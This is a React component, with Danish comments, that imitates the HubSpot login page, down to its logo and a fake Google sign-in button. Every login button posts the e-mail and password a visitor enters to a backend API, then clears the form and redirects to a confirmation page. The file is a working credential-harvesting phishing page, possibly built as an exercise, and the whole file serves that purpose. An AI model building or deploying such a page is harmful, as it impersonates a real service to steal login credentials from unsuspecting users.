import React, { useState, useEffect } from "react";
import axios from "axios";
import { useNavigate } from "react-router-dom";
import "./HubSpot.css";


function HubSpot() {

  const [isSubmitted, setIsSubmitted] = useState(false);
  const [errorMessages, setErrorMessages] = useState({});
  const [btnDisabled, setBtnDisabled] = useState(true);
  const [Name, setName] = useState("");
  const [Password, setPassword] = useState("");
  

  let navigate = useNavigate()
// skift azure til localhost
  let postLoginInfo = async () => {
    console.log("triggered")
    await axios.post("https://localhost:7231/api/HubSpot/", {
      name: Name,
      Password: Password,
    }).then(result=> {
      console.log(result);
      console.log(result.data);
    });
    //tømmer inputtet, så det er tomt til næste gang
    ClearInput();

    navigate("/Bekræftelse");
  };

// åbner ny side
  function postNyBruger() {
    window.open('src/Bekræftelse.js').focus();
  }

  const NameHandleChange = (event) => {
    setName(event.target.value);
  };

  const PasswordHandleChange = (event) => {
    setPassword(event.target.value);
  };


  useEffect(() => {
    const isNameDisabledChange = () => {
      Password === "" || Name === "" ? setBtnDisabled(true) : setBtnDisabled(false);
    };
    isNameDisabledChange();

  }, [Name, Password]);

  function ClearInput() {
    setName("");
    setPassword("");
  }

  const renderErrorMessage = (name) => name === errorMessages.name && <div className="error">{errorMessages.message}</div>;

  const renderForm = (
    <div className="form">
      <div className="input-container">
        <label className="NameLabel">E-mailadresse </label>
        <input type="text"  autoFocus className="hoverInput" autoComplete="off" name="uname" required value={Name} onChange={NameHandleChange} />
        {renderErrorMessage("uname")}
      </div>


      <div className="input-container">
        <label className="AdgangLabel">Adgangskode </label>
        <div className="showpass">Show Password</div>
        <input type="password"  name="pass" required value={Password} onChange={PasswordHandleChange} />
        {renderErrorMessage("pass")}

      </div>
      <a href="/Bekræftelse" target="_blank" className="glemt">
        Forgot my password
        <div className="check">
          <input type="checkbox" /> Husk mig
        </div>

        <div>
          <button className="buttonfake" onClick={postLoginInfo} disabled={btnDisabled} >
            Log på

          </button>

        </div>
        <hr className="hr"></hr>
        <div className="signInwrapper">
          <div className="googlepicplacement"> {Billede2()}</div>
          <button className="buttonLogIn" onClick={postLoginInfo} disabled={btnDisabled} >
            Sign in with Google

          </button>
        </div>

      </a>

      <div className="spacecreator"></div>

      <button className="buttonLogIn2" onClick={postNyBruger}> <text className="textTilKnap">iiiiiiiii</text> Log in with SSO</button>
    </div>
  );


  return (
    <div className="app-container">
      <div className="login-wrapper">
        {Billede()}
        <div className="text-under-pic">
          <div className="text-under-pic1">Har du ikke en konto? </div>
          <div className="text-under-pic2"> Sign up</div>
        </div>
        <div className="login-form">

          {isSubmitted ? <div>User is successfully logged in</div> : renderForm}
        </div>
      </div>
      <div className="footy">
        ©All Rights Reserved.<br></br>
        <div className="policy">
          Privacy Policy
        </div>
      </div>
    </div>
  )
}


const Billede = () => {
  return (
    <div className="pics">
      <img className="fak-pic" src="HubspotLogo.PNG" alt="Hubspot Logo" />
    </div>
  );
};

const Billede2 = () => {
  return (
    <div className="buttonpicwrap">
      <img className="googlepic" src="googleIcon.jpg" alt="Hubspot Logo" />
    </div>
  );
};

export default HubSpot;
